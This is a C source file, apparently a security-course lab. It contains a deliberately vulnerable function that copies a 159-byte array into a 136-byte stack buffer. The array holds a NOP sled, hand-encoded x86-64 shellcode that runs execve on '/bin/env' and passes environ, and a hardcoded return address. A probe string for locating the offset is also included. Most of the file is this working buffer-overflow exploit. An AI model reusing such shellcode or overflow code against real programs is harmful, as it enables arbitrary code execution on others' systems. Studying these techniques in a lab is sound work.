#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[159] = {
    // nop
    0x90,0x90,0x90,0x90,0x90,   // 5
    0x90,0x90,0x90,0x90,0x90,   // 10
    0x90,0x90,0x90,0x90,0x90,   // 15
    0x90,0x90,0x90,0x90,0x90,   // 20
    0x90,0x90,0x90,0x90,0x90,   // 25x
    0x90,0x90,0x90,0x90,0x90,   // 30
    0x90,0x90,0x90,0x90,0x90,   // 35
    0x90,0x90,0x90,0x90,0x90,   // 40
    0x90,0x90,0x90,0x90,0x90,   // 45
    0x90,0x90,0x90,       // 48
    // start: ; set up data on stack
    0x4D,0x31,0xC0,             // xor r8, r8       ; push 0
    0x41,0x50,                  // push r8
    //0x50, 
    0x48,0xBF,0x2F,0x62,0x69,0x6E,0x2F,0x65,0x6E,   // mov rdi, '/bin/env'
    0x76,                 
    0x57,                       // push rdi         ; push '/bin/env'
    0x48,0x89,0xE7,             // mov rdi, rsp                 
    0x50,                  // push r8          ; push 0                 
    0x57,                       // push rdi                  
    0x48,0x89,0xE6,             // mov rsi, rsp               
    //; load contents of environ in to ads
    0x48,0x31,0xD2,             // xor rdx, rdx     ; clear the RDX register
    0x66,0xBA,0xFF,0x7F,        // mov dx, 0x7fff   ; load 0x7fff into the low 16 bits of RDX (DX)
    0x48,0xC1,0xE2,0x20,        // shl rdx, 32      ; left shift RDX by 32 bits
    0xB9,0x01,0xC6,0xFB,0xF7,   // mov ecx, 0x7ffff7fbc600 ; Load 0xf7fbc600 into the low 32 bits of RCX (ECX)
    0xFF, 0xC9, //dec ecx
    0x30,0xC9,                  // xor cl, cl       ; clear the low 8 bits of RCX (CL)
    0x48,0x09,0xCA,             // or rdx, rcx      ; combine the registers using the OR instruction                         
    // ; load the RDX register with the memory pointed to by the RDX register
    0x48,0x8B,0x12,             // mov rdx, [rdx]                                   
    // ; set up system call
    0xB0,0x3B,                  // mov al,0x3B
    0x0F,0x05,                  // syscall
    //; exit system call ; Move the RAX register to RDI
    0x48,0x89,0xC7,             // mov rdi, rax   
    0x48,0x31,0xC0,             // xor rdx, rdx
    0xB0,0x3C,                  // mov al,0x3c      ; Move the value 0x3c to RA
    0x0F,0x05,                  // syscall  
    // ; space for data so stack does not overflow the code.
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // (103) + 49 nops = 152 bytes
    // return address
    0xD0,0xDF ,0xff,0xff,0xff,0x7f, // rsp - 152 = 0x7fffffffe6f0 - 152 = 0x7FFFFFFFDFD0
    //0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00,    // NULL
};

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx" //20 
    "xxxxxxxxxxxxxxxxxxxx" //40 
    "xxxxxxxxxxxxxxxxxxxx" //60 
    "xxxxxxxxxxxxxxxxxxxx" //80 
    "xxxxxxxxxxxxxxxxxxxx" //100 
    "xxxxxxxxxxxxxxxxxxxx" //120 
    "xxxxxxxxxxxxxxxxxxxx" //140
    "xxxx" //144
    "MNOPWXYZ" //152
    "xxxxxxxx"; //160
int i;

void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
        buffer[i] = compromise[i];
    }
}

